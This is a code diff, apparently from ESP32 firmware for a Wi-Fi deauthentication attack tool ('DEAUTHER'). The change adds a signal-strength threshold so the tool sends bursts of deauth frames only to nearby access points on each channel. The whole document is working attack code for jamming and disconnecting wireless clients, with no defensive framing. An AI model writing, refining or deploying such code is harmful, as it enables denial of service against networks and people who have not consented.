@@ -20,7 +20,8 @@
 #define SOFTAP_REST_TIME            500   // Home channel time
 #define SINGLE_TARGET_ROOM          80
 #define SCAN_INTERVAL_US            30000000 // 30 seconds
-#define CLIENT_RSSI_THRESHOLD       -90
+#define CLIENT_RSSI_THRESHOLD       -80
+#define AP_RSSI_THRESHOLD           -85
 
 static const char *TAG = "DEAUTHER";
 static TaskHandle_t deauther_task_handle = NULL;
@@ -267,6 +268,13 @@ void deauther_send_frames(const target_info_t *target, deauther_attack_type_t at
             if(!deauther_running) break;
 
             uint8_t ch = aps.ap[i].record.primary;
+            int8_t rssi = aps.ap[i].record.rssi;
+
+            /* Skip if rssi is too low */
+            if(rssi < AP_RSSI_THRESHOLD) {
+                continue;
+            }
+
             bool exists = false;
             for (int k = 0; k < num_channels; k++) {
                 if (target_channels[k] == ch) {
@@ -278,6 +286,7 @@ void deauther_send_frames(const target_info_t *target, deauther_attack_type_t at
                 target_channels[num_channels++] = ch;
             }
         }
+
         for (uint8_t j = 0; j < num_channels; j++) 
         {
             if(!deauther_running) break;
@@ -286,10 +295,12 @@ void deauther_send_frames(const target_info_t *target, deauther_attack_type_t at
             esp_err_t ret = wifi_set_temporary_channel(current_ch, ATTACK_WINDOW);
             if(ret != ESP_OK ) ESP_LOGI(TAG, "%s", esp_err_to_name(ret));
             vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
+            
             int64_t start_time = esp_timer_get_time();
             for (int i = 0; i < aps.count; i++) 
             {
-                if (aps.ap[i].record.primary == current_ch) 
+                /* Dont send frames to an AP with rssi lower than AP_RSSI_THRESHOLD */
+                if (aps.ap[i].record.primary == current_ch && aps.ap[i].record.rssi >= AP_RSSI_THRESHOLD) 
                 {
                     // Burst di pacchetti
                     for(int k=0; k<15; k++) {
